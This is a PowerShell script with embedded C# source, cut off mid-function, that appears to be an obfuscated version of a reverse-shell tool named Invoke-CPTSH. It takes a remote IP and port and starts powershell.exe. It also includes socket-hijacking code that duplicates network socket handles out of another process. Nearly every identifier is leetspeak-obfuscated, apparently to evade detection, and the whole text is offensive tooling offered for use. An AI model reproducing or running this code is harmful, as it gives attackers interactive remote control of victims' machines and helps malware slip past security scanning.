function Invoke-CPTSH
{   
    Param
    (
        [Parameter(Position = 0)]
        [String]
        ${R3m0t31p},
        
        [Parameter(Position = 1)]
        [String]
        ${R3m0t3P0rt},

        [Parameter()]
        [String]
        ${R0w5} = "24",

        [Parameter()]
        [String]
        ${C0l5} = "80",

        [Parameter()]
        [String]
        ${C0mm4ndL1n3} = "powershell.exe",
        
        [Parameter()]
        [Switch]
        ${Upgr4d3}
    )
    
    if( ${PSBoundParameters}.ContainsKey('Upgr4d3') ) {
        ${R3m0t31p} = "upgrade"
        ${R3m0t3P0rt} = "shell"
    }
    else{
        if(-Not(${PSBoundParameters}.ContainsKey('R3m0t31p'))) {
            throw "RemoteIp missing parameter"
        }
        if(-Not(${PSBoundParameters}.ContainsKey('R3m0t3P0rt'))) {
            throw "RemotePort missing parameter"
        }
    }
    ${p4r4m3t3r5CPTSH} = @(${R3m0t31p}, ${R3m0t3P0rt}, ${R0w5}, ${C0l5}, ${C0mm4ndL1n3})
    Add-Type -TypeDefinition ${S0urc3} -Language CSharp;
    ${0utput} = [CPTSHMainClass]::CPTSHMain(${p4r4m3t3r5CPTSH})
    Write-Output ${0utput}
}

${S0urc3} = @"
using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;

public class CPTSHException : Exception
{
    private const string ${3rr0r5tr1ng} = "[-] CPTSHException: ";

    public CPTSHException() { }

    public CPTSHException(string ${m3554g3}) : base(${3rr0r5tr1ng} + ${m3554g3}) { }
}

public class DeadlockCheckHelper
{
    private bool ${d34dl0ckD3t3ct3d};
    private IntPtr ${t4rg3tH4ndl3};

    private delegate uint LPTHREAD_START_ROUTINE(uint ${lpP4r4m});

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr ${h0bj3ct});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr ${hH4ndl3}, UInt32 ${dwM1ll153c0nd5});

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(uint ${lpThr34d4ttr1but35}, uint ${dwSt4ckS1z3}, LPTHREAD_START_ROUTINE ${lpSt4rt4ddr355}, IntPtr ${lpP4r4m3t3r}, uint ${dwCr34t10nFl4g5}, out uint ${lpThr34d1d});

    private uint ThreadCheckDeadlock(uint ${thr34dP4r4m5})
    {
        IntPtr ${0bjPtr} = IntPtr.Zero;
        ${0bjPtr} = SocketHijacking.NtQueryObjectDynamic(this.${t4rg3tH4ndl3}, SocketHijacking.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
        this.${d34dl0ckD3t3ct3d} = false;
        if (${0bjPtr} != IntPtr.Zero) Marshal.FreeHGlobal(${0bjPtr});
        return 0;
    }

    public bool CheckDeadlockDetected(IntPtr ${tH4ndl3})
    {
        this.${d34dl0ckD3t3ct3d} = true;
        this.${t4rg3tH4ndl3} = ${tH4ndl3};
        LPTHREAD_START_ROUTINE ${d3l3g4t3Thr34dCh3ckD34dl0ck} = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
        IntPtr ${hThr34d} = IntPtr.Zero;
        uint ${thr34d1d} = 0;
        ${hThr34d} = CreateThread(0, 0, ${d3l3g4t3Thr34dCh3ckD34dl0ck}, IntPtr.Zero, 0, out ${thr34d1d});
        WaitForSingleObject(${hThr34d}, 1500);
        CloseHandle(${hThr34d});
        return this.${d34dl0ckD3t3ct3d};
    }
}

public static class SocketHijacking
{
    private const uint ${NTST4TUSSUCC355} = 0x00000000;
    private const uint ${NTST4TUS1NF0L3NGTHM1SM4TCH} = 0xc0000004;
    private const uint ${NTST4TUSBUFF3R0V3RFL0W} = 0x80000005;
    private const uint ${NTST4TUSBUFF3RT005M4LL} = 0xc0000023;
    private const int ${NTST4TUSP3ND1NG} = 0x00000103;
    private const int ${WSAFL4G0V3RL4PP3D} = 0x1;
    private const int ${DUPL1C4T3S4M34CC355} = 0x2;
    private const int ${Syst3mH4ndl31nf0rm4t10n} = 16;
    private const int ${PR0C355DUPH4NDL3} = 0x0040;
    private const int ${S10TCP1NF0} = unchecked((int)0xD8000027);
    private const int ${SGUNCONSTR41N3DGR0UP} = 0x1;
    private const int ${SGCONSTR41N3DGR0UP} = 0x2;
    private const uint ${10CTL4FDG3TC0NT3XT} = 0x12043;
    private const int ${3V3NT4LL4CC355} = 0x1f0003;
    private const int ${Synchr0n1z4t10n3v3nt} = 1;
    private const UInt32 ${1NF1N1T3} = 0xFFFFFFFF;

    private enum SOCKET_STATE : uint
    {
        SocketOpen = 0,
        SocketBound = 1,
        SocketBoundUdp = 2,
        SocketConnected = 3,
        SocketClosed = 3
    }

    private enum AFD_GROUP_TYPE : uint
    {
        GroupTypeNeither = 0,
        GroupTypeConstrained = ${SGCONSTR41N3DGR0UP},
        GroupTypeUnconstrained = ${SGUNCONSTR41N3DGR0UP}
    }

    public enum OBJECT_INFORMATION_CLASS : int
    {
        ObjectBasicInformation = 0,
        ObjectNameInformation = 1,
        ObjectTypeInformation = 2,
        ObjectAllTypesInformation = 3,
        ObjectHandleInformation = 4
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
    {
        public ushort UniqueProcessId;
        public ushort CreatorBackTraceIndex;
        public byte ObjectTypeIndex;
        public byte HandleAttributes;
        public ushort HandleValue;
        public IntPtr Object;
        public IntPtr GrantedAccess;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct GENERIC_MAPPING
    {
        public int GenericRead;
        public int GenericWrite;
        public int GenericExecute;
        public int GenericAll;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_TYPE_INFORMATION_V2
    {
        public UNICODE_STRING TypeName;
        public uint TotalNumberOfObjects;
        public uint TotalNumberOfHandles;
        public uint TotalPagedPoolUsage;
        public uint TotalNonPagedPoolUsage;
        public uint TotalNamePoolUsage;
        public uint TotalHandleTableUsage;
        public uint HighWaterNumberOfObjects;
        public uint HighWaterNumberOfHandles;
        public uint HighWaterPagedPoolUsage;
        public uint HighWaterNonPagedPoolUsage;
        public uint HighWaterNamePoolUsage;
        public uint HighWaterHandleTableUsage;
        public uint InvalidAttributes;
        public GENERIC_MAPPING GenericMapping;
        public uint ValidAccessMask;
        public byte SecurityRequired;
        public byte MaintainHandleCount;
        public byte TypeIndex;
        public byte ReservedByte;
        public uint PoolType;
        public uint DefaultPagedPoolCharge;
        public uint DefaultNonPagedPoolCharge;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_NAME_INFORMATION
    {
        public UNICODE_STRING Name;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;
        public short wHighVersion;
        public short iMaxSockets;
        public short iMaxUdpDg;
        public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOLCHAIN
    {
        public int ChainLen;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
        public uint[] ChainEntries;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOL_INFO
    {
        public uint dwServiceFlags1;
        public uint dwServiceFlags2;
        public uint dwServiceFlags3;
        public uint dwServiceFlags4;
        public uint dwProviderFlags;
        public Guid ProviderId;
        public uint dwCatalogEntryId;
        public WSAPROTOCOLCHAIN ProtocolChain;
        public int iVersion;
        public int iAddressFamily;
        public int iMaxSockAddr;
        public int iMinSockAddr;
        public int iSocketType;
        public int iProtocol;
        public int iProtocolMaxOffset;
        public int iNetworkByteOrder;
        public int iSecurityScheme;
        public uint dwMessageSize;
        public uint dwProviderReserved;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szProtocol;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TCP_INFO_v0
    {
        public TcpState State;
        public UInt32 Mss;
        public UInt64 ConnectionTimeMs;
        public byte TimestampsEnabled;
        public UInt32 RttUs;
        public UInt32 MinRttUs;
        public UInt32 BytesInFlight;
        public UInt32 Cwnd;
        public UInt32 SndWnd;
        public UInt32 RcvWnd;
        public UInt32 RcvBuf;
        public UInt64 BytesOut;
        public UInt64 BytesIn;
        public UInt32 BytesReordered;
        public UInt32 BytesRetrans;
        public UInt32 FastRetrans;
        public UInt32 DupAcksIn;
        public UInt32 TimeoutEpisodes;
        public byte SynRetrans;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct linger
    {
        public UInt16 l_onoff;
        public UInt16 l_linger;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    private struct IO_STATUS_BLOCK
    {
        public int status;
        public IntPtr information;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCK_SHARED_INFO
    {
        public SOCKET_STATE State;
        public Int32 AddressFamily;
        public Int32 SocketType;
        public Int32 Protocol;
        public Int32 LocalAddressLength;
        public Int32 RemoteAddressLength;
        public linger LingerInfo;
        public UInt32 SendTimeout;
        public UInt32 ReceiveTimeout;
        public UInt32 ReceiveBufferSize;
        public UInt32 SendBufferSize;
        public ushort SocketProperty;
        public UInt32 CreationFlags;
        public UInt32 CatalogEntryId;
        public UInt32 ServiceFlags1;
        public UInt32 ProviderFlags;
        public UInt32 GroupID;
        public AFD_GROUP_TYPE GroupType;
        public Int32 GroupPriority;
        public Int32 LastError;
        public IntPtr AsyncSelecthWnd;
        public UInt32 AsyncSelectSerialNumber;
        public UInt32 AsyncSelectwMsg;
        public Int32 AsyncSelectlEvent;
        public Int32 DisabledAsyncSelectEvents;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR
    {
        public UInt16 sa_family;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 14)]
        public byte[] sa_data;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKET_CONTEXT
    {
        public SOCK_SHARED_INFO SharedData;
        public UInt32 SizeOfHelperData;
        public UInt32 Padding;
        public SOCKADDR LocalAddress;
        public SOCKADDR RemoteAddress;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
        public byte[] HelperData;
    }

    private struct SOCKET_BYTESIN
    {
        public IntPtr handle;
        public UInt64 BytesIn;
    }

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSADuplicateSocket(IntPtr ${s0ck3tH4ndl3}, int ${pr0c3551d}, ref WSAPROTOCOL_INFO ${p1nn3dBuff3r});

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern IntPtr WSASocket([In] int ${4ddr355F4m1ly}, [In] int ${s0ck3tTyp3}, [In] int ${pr0t0c0lTyp3}, ref WSAPROTOCOL_INFO ${lpPr0t0c0l1nf0}, Int32 ${gr0up1}, int ${dwFl4g5});

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern int getpeername(IntPtr ${5}, ref SOCKADDR_IN ${n4m3}, ref int ${n4m3l3n});

    [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "WSAIoctl")]
    public static extern int WSAIoctl1(IntPtr ${5}, int ${dw10C0ntr0lC0d3}, ref UInt32 ${lpv1nBuff3r}, int ${cb1nBuff3r}, IntPtr ${lpv0utBuff3r}, int ${cb0utBuff3r}, ref int ${lpcbByt35R3turn3d}, IntPtr ${lp0v3rl4pp3d}, IntPtr ${lpC0mpl3t10nR0ut1n3});

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr ${5});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int ${pr0c3554cc355}, bool ${b1nh3r1tH4ndl3}, int ${pr0c3551d});

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr ${hS0urc3Pr0c355H4ndl3}, IntPtr ${hS0urc3H4ndl3}, IntPtr ${hT4rg3tPr0c355H4ndl3}, out IntPtr ${lpT4rg3tH4ndl3}, uint ${dwD351r3d4cc355}, [MarshalAs(UnmanagedType.Bool)] bool ${b1nh3r1tH4ndl3}, uint ${dw0pt10n5});

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr ${h0bj3ct});

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("ntdll.dll")]
    private static extern uint NtQueryObject(IntPtr ${0bj3ctH4ndl3}, OBJECT_INFORMATION_CLASS ${1nf0rm4t10nCl455}, IntPtr ${1nf0rm4t10nPtr}, uint ${1nf0rm4t10nL3ngth}, ref int ${r3turnL3ngth});

    [DllImport("ntdll.dll")]
    private static extern uint NtQuerySystemInformation(int ${Syst3m1nf0rm4t10nCl455}, IntPtr ${Syst3m1nf0rm4t10n}, int ${Syst3m1nf0rm4t10nL3ngth}, ref int ${r3turnL3ngth});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr ${hH4ndl3}, UInt32 ${dwM1ll153c0nd5});

     [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
    private static extern int NtDeviceIoControlFile1(IntPtr ${F1l3H4ndl3}, IntPtr ${3v3nt}, IntPtr ${4pcR0ut1n3}, IntPtr ${4pcC0nt3xt}, ref IO_STATUS_BLOCK ${10St4tusBl0ck}, uint ${10C0ntr0lC0d3}, IntPtr ${1nputBuff3r}, int ${1nputBuff3rL3ngth}, ref SOCKET_CONTEXT ${0utputBuff3r}, int ${0utputBuff3rL3ngth});

    [DllImport("Ws2_32.dll")]
    public static extern int ioctlsocket(IntPtr ${5}, int ${cmd}, ref int ${4rgp});
    
    private static IntPtr NtQuerySystemInformationDynamic(int ${1nf0Cl455}, int ${1nf0L3ngth})
    {
        if (${1nf0L3ngth} == 0)
            ${1nf0L3ngth} = 0x10000;
        IntPtr ${1nf0Ptr} = Marshal.AllocHGlobal(${1nf0L3ngth});
        while (true)
        {
            uint ${r3sult} = (uint)NtQuerySystemInformation(${1nf0Cl455}, ${1nf0Ptr}, ${1nf0L3ngth}, ref ${1nf0L3ngth});
            ${1nf0L3ngth} = ${1nf0L3ngth} * 2;
            if (${r3sult} == ${NTST4TUSSUCC355})
                return ${1nf0Ptr};
            Marshal.FreeHGlobal(${1nf0Ptr});
            if (${r3sult} != ${NTST4TUS1NF0L3NGTHM1SM4TCH} && ${r3sult} != ${NTST4TUSBUFF3R0V3RFL0W} && ${r3sult} != ${NTST4TUSBUFF3RT005M4LL})
            {
                return IntPtr.Zero;
            }
            ${1nf0Ptr} = Marshal.AllocHGlobal(${1nf0L3ngth});
        }
    }

    private static IntPtr QueryObjectTypesInfo()
    {
        IntPtr ${ptr0bj3ctTyp35Inf0} = IntPtr.Zero;
        ${ptr0bj3ctTyp35Inf0} = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);
        return ${ptr0bj3ctTyp35Inf0};
    }

    private static long AlignUp(long ${4ddr355}, long ${4l1gn})
    {
        return (((${4ddr355}) + (${4l1gn}) - 1) & ~((${4l1gn}) - 1));
    }

    private static byte GetTypeIndexByName(string ${0bj3ctN4m3})
    {
        byte ${Typ31nd3x} = 0;
        long ${Typ35C0unt} = 0;
        IntPtr ${ptrTyp35Inf0} = IntPtr.Zero;
        ${ptrTyp35Inf0} = QueryObjectTypesInfo();
        ${Typ35C0unt} = Marshal.ReadIntPtr(${ptrTyp35Inf0}).ToInt64();
        IntPtr ${ptrTyp35Inf0Curr3nt} = new IntPtr(${ptrTyp35Inf0}.ToInt64() + IntPtr.Size);
        for (int ${1} = 0; ${1} < ${Typ35C0unt}; ${1}++)
        {
            OBJECT_TYPE_INFORMATION_V2 ${Typ3} = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(${ptrTyp35Inf0Curr3nt}, typeof(OBJECT_TYPE_INFORMATION_V2));
            ${ptrTyp35Inf0Curr3nt} = (IntPtr)(${ptrTyp35Inf0Curr3nt}.ToInt64() + AlignUp(${Typ3}.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
            if (${Typ3}.TypeName.Length > 0 && Marshal.PtrToStringUni(${Typ3}.TypeName.Buffer, ${Typ3}.TypeName.Length / 2) == ${0bj3ctN4m3})
            {
                ${Typ31nd3x} = ${Typ3}.TypeIndex;
                break;
            }
        }
        Marshal.FreeHGlobal(${ptrTyp35Inf0});
        return ${Typ31nd3x};
    }

    private static List<IntPtr> DuplicateSocketsFromHandles(List<IntPtr> ${s0ck3t5})
    {
        List<IntPtr> ${dup3dS0ck3t50ut} = new List<IntPtr>();
        if (${s0ck3t5}.Count < 1) return ${dup3dS0ck3t50ut};
        foreach (IntPtr ${s0ck} in ${s0ck3t5})
        {
            IntPtr ${dup3dS0ck3t} = DuplicateSocketFromHandle(${s0ck});
            if (${dup3dS0ck3t} != IntPtr.Zero) ${dup3dS0ck3t50ut}.Add(${dup3dS0ck3t});
        }
        foreach (IntPtr ${s0ck} in ${s0ck3t5})
            CloseHandle(${s0ck});
        return ${dup3dS0ck3t50ut};
    }

    private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> ${s0ck3t5})
    {
        List<SOCKET_BYTESIN> ${s0ck3t5Byt35In} = new List<SOCKET_BYTESIN>();
        List<IntPtr> ${s0ck3t50ut} = new List<IntPtr>();
        foreach (IntPtr ${s0ck} in ${s0ck3t5})
        {
            TCP_INFO_v0 ${s0ck1nf0} = new TCP_INFO_v0();
            if (!GetSocketTcpInfo(${s0ck}, out ${s0ck1nf0}))
            {
                closesocket(${s0ck});
                continue;
            }
            if (${s0ck1nf0}.State == TcpState.SynReceived || ${s0ck1nf0}.State == TcpState.Established)
            {
                SOCKET_BYTESIN ${s0ckByt35In} = new SOCKET_BYTESIN();
                ${s0ckByt35In}.handle = ${s0ck};
                ${s0ckByt35In}.BytesIn = ${s0ck1nf0}.BytesIn;
                ${s0ck3t5Byt35In}.Add(${s0ckByt35In});
            }
            else
                closesocket(${s0ck});
        }
        if (${s0ck3t5Byt35In}.Count < 1) return ${s0ck3t50ut};
        if (${s0ck3t5Byt35In}.Count >= 2)
            ${s0ck3t5Byt35In}.Sort(delegate (SOCKET_BYTESIN ${4}, SOCKET_BYTESIN ${b}) { return (${4}.BytesIn.CompareTo(${b}.BytesIn)); });
        foreach (SOCKET_BYTESIN ${s0ckByt35In} in ${s0ck3t5Byt35In})
        {
            ${s0ck3t50ut}.Add(${s0ckByt35In}.handle);
        }
        return ${s0ck3t50ut};
    }

    private static bool GetSocketTcpInfo(IntPtr ${s0ck3t}, out TCP_INFO_v0 ${tcp1nf00ut})
    {
        int ${r3sult} = -1;
        UInt32 ${tcp1nf0V3rs10n} = 0;
        int ${byt35R3turn3d} = 0;
        int ${tcp1nf0S1z3} = Marshal.SizeOf(typeof(TCP_INFO_v0));
        IntPtr ${tcp1nf0Ptr} = Marshal.AllocHGlobal(${tcp1nf0S1z3});
        ${r3sult} = WSAIoctl1(${s0ck3t}, ${S10TCP1NF0}, ref ${tcp1nf0V3rs10n}, Marshal.SizeOf(${tcp1nf0V3rs10n}), ${tcp1nf0Ptr}, ${tcp1nf0S1z3}, ref ${byt35R3turn3d}, IntPtr.Zero, IntPtr.Zero);
        if (${r3sult} != 0)
        {
            ${tcp1nf00ut} = new TCP_INFO_v0();
            return false;
        }
        TCP_INFO_v0 ${tcp1nf0V0} = (TCP_INFO_v0)Marshal.PtrToStructure(${tcp1nf0Ptr}, typeof(TCP_INFO_v0));
        ${tcp1nf00ut} = ${tcp1nf0V0};
        Marshal.FreeHGlobal(${tcp1nf0Ptr});
        return true;
    }

    private static IntPtr DuplicateSocketFromHandle(IntPtr ${s0ck3tH4ndl3})
    {
        IntPtr ${r3tS0ck3t} = IntPtr.Zero;
        IntPtr ${dup1ic4t3dS0ck3t} = IntPtr.Zero;
        WSAPROTOCOL_INFO ${ws4Pr0t0c0l1nf0} = new WSAPROTOCOL_INFO();
        int ${st4tu5} = WSADuplicateSocket(${s0ck3tH4ndl3}, Process.GetCurrentProcess().Id, ref ${ws4Pr0t0c0l1nf0});
        if (${st4tu5} == 0)
        {
            ${dup1ic4t3dS0ck3t} = WSASocket(${ws4Pr0t0c0l1nf0}.iAddressFamily, ${ws4Pr0t0c0l1nf0}.iSocketType, ${ws4Pr0t0c0l1nf0}.iProtocol, ref ${ws4Pr0t0c0l1nf0}, 0, 0);
            if (${dup1ic4t3dS0ck3t}.ToInt64() > 0)
            {
                ${r3tS0ck3t} = ${dup1ic4t3dS0ck3t};
            }
        }
        return ${r3tS0ck3t};
    }

    public static IntPtr NtQueryObjectDynamic(IntPtr ${h4ndl3}, OBJECT_INFORMATION_CLASS ${1nf0Cl455}, int ${1nf0L3ngth})
    {
        if (${1nf0L3ngth} == 0)
            ${1nf0L3ngth} = Marshal.SizeOf(typeof(int));
        IntPtr ${1nf0Ptr} = Marshal.AllocHGlobal(${1nf0L3ngth});
        uint ${r3sult};
        while (true)
        {
            ${r3sult} = (uint)NtQueryObject(${h4ndl3}, ${1nf0Cl455}, ${1nf0Ptr}, (uint)${1nf0L3ngth}, ref ${1nf0L3ngth});
            if (${r3sult} == ${NTST4TUS1NF0L3NGTHM1SM4TCH} || ${r3sult} == ${NTST4TUSBUFF3R0V3RFL0W} || ${r3sult} == ${NTST4TUSBUFF3RT005M4LL})
            {
                Marshal.FreeHGlobal(${1nf0Ptr});
                ${1nf0Ptr} = Marshal.AllocHGlobal((int)${1nf0L3ngth});
                continue;
            }
            else if (${r3sult} == ${NTST4TUSSUCC355})
                break;
            else
            {
                break;
            }
        }
        if (${r3sult} == ${NTST4TUSSUCC355})
            return ${1nf0Ptr};
        else
            Marshal.FreeHGlobal(${1nf0Ptr});
        return IntPtr.Zero;
    }

    public static List<IntPtr> GetSocketsTargetProcess(Process ${t4rg3tPr0c355})
    {
        OBJECT_NAME_INFORMATION ${0bjN4m31nf0};
        long ${H4ndl35C0unt} = 0;
        IntPtr ${dupH4ndl3};
        IntPtr ${ptr0bj3ctN4m3};
        IntPtr ${ptrH4ndl35Inf0};
        IntPtr ${hT4rg3tPr0c355};
        string ${str0bj3ctN4m3};
        List<IntPtr> ${s0ck3t5H4ndl35} = new List<IntPtr>();
        DeadlockCheckHelper ${d34dl0ckCh3ckH3lp3r0bj} = new DeadlockCheckHelper();
        ${hT4rg3tPr0c355} = OpenProcess(${PR0C355DUPH4NDL3}, false, ${t4rg3tPr0c355}.Id);
        if (${hT4rg3tPr0c355} == IntPtr.Zero)
        {
            return ${s0ck3t5H4ndl35};
        }
        ${ptrH4ndl35Inf0} = NtQuerySystemInformationDynamic(${Syst3mH4ndl31nf0rm4t10n}, 0);
        ${H4ndl35C0unt} = Marshal.ReadIntPtr(${ptrH4ndl35Inf0}).ToInt64();
        IntPtr ${ptrH4ndl35Inf0Curr3nt} = new IntPtr(${ptrH4ndl35Inf0}.ToInt64() + IntPtr.Size);
        byte ${Typ31nd3xF1l30bj3ct} = GetTypeIndexByName("File");
        for (int ${1} = 0; ${1} < ${H4ndl35C0unt}; ${1}++)
        {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO ${syst4mH4ndl3};
            try
            {
                ${syst4mH4ndl3} = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(${ptrH4ndl35Inf0Curr3nt}, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            }
            catch
            {
                break;
            }
            ${ptrH4ndl35Inf0Curr3nt} = (IntPtr)(${ptrH4ndl35Inf0Curr3nt}.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
            if (${syst4mH4ndl3}.UniqueProcessId != ${t4rg3tPr0c355}.Id || ${syst4mH4ndl3}.ObjectTypeIndex != ${Typ31nd3xF1l30bj3ct})
                continue;
            if (DuplicateHandle(${hT4rg3tPr0c355}, (IntPtr)${syst4mH4ndl3}.HandleValue, GetCurrentProcess(), out ${dupH4ndl3}, 0, false, ${DUPL1C4T3S4M34CC355}))
            {
                if (${d34dl0ckCh3ckH3lp3r0bj}.CheckDeadlockDetected(${dupH4ndl3}))
                {
                    CloseHandle(${dupH4ndl3});
                    continue;
                }
                ${ptr0bj3ctN4m3} = NtQueryObjectDynamic(${dupH4ndl3}, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
                if (${ptr0bj3ctN4m3} == IntPtr.Zero)
                {
                    CloseHandle(${dupH4ndl3});
                    continue;
                }
                try
                {
                    ${0bjN4m31nf0} = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(${ptr0bj3ctN4m3}, typeof(OBJECT_NAME_INFORMATION));
                }
                catch
                {
                    CloseHandle(${dupH4ndl3});
                    continue;
                }
                if (${0bjN4m31nf0}.Name.Buffer != IntPtr.Zero && ${0bjN4m31nf0}.Name.Length > 0)
                {
                    ${str0bj3ctN4m3} = Marshal.PtrToStringUni(${0bjN4m31nf0}.Name.Buffer, ${0bjN4m31nf0}.Name.Length / 2);
                    if (${str0bj3ctN4m3} == "\\Device\\Afd")
                        ${s0ck3t5H4ndl35}.Add(${dupH4ndl3});
                    else
                        CloseHandle(${dupH4ndl3});
                }
                else
                    CloseHandle(${dupH4ndl3});
                Marshal.FreeHGlobal(${ptr0bj3ctN4m3});
                ${ptr0bj3ctN4m3} = IntPtr.Zero;
            }
        }
        Marshal.FreeHGlobal(${ptrH4ndl35Inf0});
        List<IntPtr> ${dup3dS0ck3t5H4ndl35} = DuplicateSocketsFromHandles(${s0ck3t5H4ndl35});
        if (${dup3dS0ck3t5H4ndl35}.Count >= 1)
            ${dup3dS0ck3t5H4ndl35} = FilterAndOrderSocketsByBytesIn(${dup3dS0ck3t5H4ndl35});
        ${s0ck3t5H4ndl35} = ${dup3dS0ck3t5H4ndl35};
        return ${s0ck3t5H4ndl35};
    }

    public static bool IsSocketInherited(IntPtr ${s0ck3tH4ndl3}, Process ${p4r3ntPr0c355})
    {
        bool ${1nh3r1t3d} = false;
        List<IntPtr> ${p4r3ntS0ck3t5H4ndl35} = GetSocketsTargetProcess(${p4r3ntPr0c355});
        if (${p4r3ntS0ck3t5H4ndl35}.Count < 1)
            return ${1nh3r1t3d};
        foreach (IntPtr ${p4r3ntS0ck3tH4ndl3} in ${p4r3ntS0ck3t5H4ndl35})
        {
            SOCKADDR_IN ${s0ck4ddrT4rg3tPr0c355} = new SOCKADDR_IN();
            SOCKADDR_IN ${s0ck4ddrP4r3ntPr0c355} = new SOCKADDR_IN();
            int ${s0ck4ddrT4rg3tPr0c355L3n} = Marshal.SizeOf(${s0ck4ddrT4rg3tPr0c355});
            int ${s0ck4ddrP4r3ntPr0c355L3n} = Marshal.SizeOf(${s0ck4ddrP4r3ntPr0c355});
            if (
                (getpeername(${s0ck3tH4ndl3}, ref ${s0ck4ddrT4rg3tPr0c355}, ref ${s0ck4ddrT4rg3tPr0c355L3n}) == 0) &&
                (getpeername(${p4r3ntS0ck3tH4ndl3}, ref ${s0ck4ddrP4r3ntPr0c355}, ref ${s0ck4ddrP4r3ntPr0c355L3n}) == 0) &&
                (${s0ck4ddrT4rg3tPr0c355}.sin_addr == ${s0ck4ddrP4r3ntPr0c355}.sin_addr && ${s0ck4ddrT4rg3tPr0c355}.sin_port == ${s0ck4ddrP4r3ntPr0c355}.sin_port)
               )
            {
                ${1nh3r1t3d} = true;
            }
            closesocket(${p4r3ntS0ck3tH4ndl3});
        }
        return ${1nh3r1t3d};
    }

    public static bool IsSocketOverlapped(IntPtr ${s0ck3t})
    {
        bool ${r3t} = false;
        IntPtr ${s0ck3v3nt} = IntPtr.Zero;
        int ${ntSt4tu5} = -1;
        SOCKET_CONTEXT ${c0nt3xtD4t4} = new SOCKET_CONTEXT();
        ${ntSt4tu5} = NtCreateEvent(ref ${s0ck3v3nt}, ${3V3NT4LL4CC355}, IntPtr.Zero, ${Synchr0n1z4t10n3v3nt}, false);
        if (${ntSt4tu5} != ${NTST4TUSSUCC355})
        {
            return ${r3t};
        }
        IO_STATUS_BLOCK ${10SB} = new IO_STATUS_BLOCK();
        ${ntSt4tu5} = NtDeviceIoControlFile1(${s0ck3t}, ${s0ck3v3nt}, IntPtr.Zero, IntPtr.Zero, ref ${10SB}, ${10CTL4FDG3TC0NT3XT}, IntPtr.Zero, 0, ref ${c0nt3xtD4t4}, Marshal.SizeOf(${c0nt3xtD4t4}));
        if (${ntSt4tu5} == ${NTST4TUSP3ND1NG})
        {
            WaitForSingleObject(${s0ck3v3nt}, ${1NF1N1T3});
            ${ntSt4tu5} = ${10SB}.status;
        }
        CloseHandle(${s0ck3v3nt});

        if (${ntSt4tu5} != ${NTST4TUSSUCC355})
        {
            return ${r3t};
        }
